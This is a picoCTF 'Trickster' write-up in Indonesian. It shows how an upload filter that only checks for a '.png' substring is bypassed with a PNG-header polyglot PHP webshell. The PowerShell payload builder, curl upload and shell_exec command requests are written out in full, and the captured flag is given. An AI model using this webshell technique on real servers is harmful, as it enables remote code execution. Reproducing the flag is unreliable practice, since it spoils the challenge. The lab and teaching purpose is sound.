# Trickster

| Informasi | Detail |
| --- | --- |
| Platform / Event | picoCTF |
| Kategori | Web Exploitation |
| Tingkat Kesulitan | Medium |
| Status | Solved |

## Deskripsi

Aplikasi "PNG processing app" (PHP + Apache) menerima upload file dengan syarat:
nama file harus mengandung `.png`, magic bytes harus PNG, dan ekstensi `.php`
diblokir. Tujuan akhirnya adalah mendapatkan eksekusi kode di server dan membaca flag.

## Informasi Awal

Instance dapat diakses melalui:

```text
http://atlas.picoctf.net:49643/
```

Halaman utama berisi form upload `multipart/form-data` dengan field `file`.
`instructions.txt` di webroot (ditemukan belakangan) membenarkan mekanisme filter:
cek substring `.png` pada nama file, cek magic bytes PNG, dan simpan file untuk
"diproses admin".

## Tools

- curl.exe (upload dan probing, dijalankan dari PowerShell)
- PowerShell (membuat payload polyglot PNG + PHP)

## Analisis

### Pemetaan validasi

Upload satu per satu varian nama file (isi: header PNG `\x89PNG\r\n\x1a\n`):

| Nama file | Hasil | Kesimpulan |
| --- | --- | --- |
| `test.png.php` | diterima | blok `.php` bukan berdasarkan nama penuh |
| `test.php.png` | diterima | sama |
| `test.php` | ditolak | magic bytes / cek lain |
| `test.png.phtml` | diterima | ekstensi bebas asal mengandung `.png` |
| `.htaccess` | ditolak | `.htaccess` diblokir |
| `test.ppng` | ditolak | butuh substring `.png` |

Dengan upload `sh.phtml` (header PNG + `<?php echo shell_exec(...); ?>`) muncul
error: `File name does not contain '.png'.` — jadi aturan namanya adalah
*substring* `.png` harus ada, bukan ekstensi akhir. `sh.png.phtml` lolos
semua filter.

### Lokasi file tersimpan

File tersimpan di `/uploads/` dengan nama asli. Probe beberapa kandidat path
dengan `?cmd=whoami`:

```text
/uploads/sh.png.phtml => HTTP 200
/upload, /files, /static, /images, /tmp => 404
```

### Pemilihan ekstensi eksekusi

`/uploads/sh.png.phtml` memancarkan kode PHP mentah — Apache tidak meng-handle
`.phtml` sebagai PHP. Versi `.php` (`sh.png.php`, lolos karena validasi hanya
cek substring `.png`) dieksekusi dengan benar dan mengembalikan output perintah:

```text
www-data
bin boot challenge dev etc ... var
MFRDAZLDMUYDG.txt  index.php  instructions.txt  robots.txt  uploads
```

## Langkah Penyelesaian

1. Buat payload polyglot — header PNG + webshell (PowerShell, perhatikan bahwa
   `$_GET` harus ditulis dalam string single-quoted agar tidak terinterpolasi
   PowerShell):

```powershell
$sh = [byte[]](0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A) + [Text.Encoding]::ASCII.GetBytes('<?php echo shell_exec($_GET["cmd"]); ?>')
[IO.File]::WriteAllBytes("$env:TEMP\sh.png.php", $sh)
```

2. Upload:

```powershell
curl.exe -s -F "file=@$env:TEMP\sh.png.php;type=image/png" "http://atlas.picoctf.net:49643/"
```

3. Eksekusi perintah lewat webshell dan listing webroot:

```powershell
curl.exe -s "http://atlas.picoctf.net:49643/uploads/sh.png.php?cmd=whoami;ls+/;ls+/var/www/html"
```

4. Baca file flag:

```powershell
curl.exe -s "http://atlas.picoctf.net:49643/uploads/sh.png.php?cmd=cat+/var/www/html/MFRDAZLDMUYDG.txt"
```

## Flag

```text
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_ab0ece03}
```

## Pembelajaran

- Validasi yang cek *substring* ekstensi (`.png` di mana saja) tidak mencegah
  upload file PHP — `sh.png.php` tetap lolos.
- Blokir berdasarkan nama file vs ekstensi akhir berbeda makna; uji keduanya
  untuk memetakan filter.
- `.phtml` tidak selalu dieksekusi server — selalu verifikasi apakah kode PHP
  di-render atau dicetak mentah sebelum lanjut.
- Error message yang jujur ("File name does not contain '.png'") adalah recon
  gratis: ia mendokumentasikan aturan filter secara eksplisit.

## Referensi

- OWASP Unrestricted File Upload
- Instance: http://atlas.picoctf.net:49643/